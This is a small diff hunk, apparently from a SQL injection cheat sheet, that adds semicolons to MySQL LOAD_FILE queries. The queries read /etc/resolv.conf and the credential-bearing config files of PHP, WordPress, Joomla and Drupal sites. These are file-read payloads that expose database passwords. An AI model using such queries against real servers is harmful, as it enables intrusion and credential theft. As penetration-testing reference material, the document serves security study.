@@ -181,10 +181,10 @@ SELECT LOAD_FILE('/etc/resolv.conf');
 
 ```sql
 -- Check for common configuration files
-SELECT LOAD_FILE('/var/www/html/config.php')
-SELECT LOAD_FILE('/var/www/html/wp-config.php')
-SELECT LOAD_FILE('/var/www/html/configuration.php')   -- Joomla
-SELECT LOAD_FILE('/var/www/html/sites/default/settings.php')  -- Drupal
+SELECT LOAD_FILE('/var/www/html/config.php');
+SELECT LOAD_FILE('/var/www/html/wp-config.php');
+SELECT LOAD_FILE('/var/www/html/configuration.php');   -- Joomla
+SELECT LOAD_FILE('/var/www/html/sites/default/settings.php');  -- Drupal
 ```
 
 ### Injection Context Examples
